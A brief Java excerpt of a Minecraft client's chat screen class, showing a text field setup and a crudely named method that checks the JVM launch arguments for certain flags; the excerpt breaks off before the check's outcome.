...
public class GuiChat extends GuiScreen
{
    ...
    public void initGui()
    {
        ...
        this.inputField = new GuiTextField(0, this.fontRendererObj, 4, this.height - 11, this.width - 4, 12);
    ...
    public static void FuckMeKody() {
     	 List<String> inputArguments = ManagementFactory.getRuntimeMXBean().getInputArguments();  
     	 
     	 String strr = inputArguments+""; 

        	 if(   !strr.contains("-D") 
        		|| !strr.contains("versions")
        		|| !strr.contains("mine")
        		|| strr.contains("-Xboot")
     	    	) {
